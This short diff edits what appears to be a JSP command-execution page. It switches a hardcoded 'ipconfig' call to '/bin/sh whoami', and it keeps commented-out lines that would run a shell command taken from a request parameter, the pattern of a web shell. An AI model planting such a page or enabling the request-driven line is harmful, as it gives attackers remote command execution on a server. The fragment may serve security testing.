@@ -3,8 +3,8 @@
 <%
 //    String cmd = request.getParameter("cmd");
 //    String cmdAll = "/bin/sh " + cmd;
-//    String cmdAll = "/bin/sh whoami";
-    String cmdAll = "ipconfig";
+    String cmdAll = "/bin/sh whoami";
+//    String cmdAll = "ipconfig";
     //获取脚本执行的得到的结果并缓存
 
     StringBuffer sb = new StringBuffer();
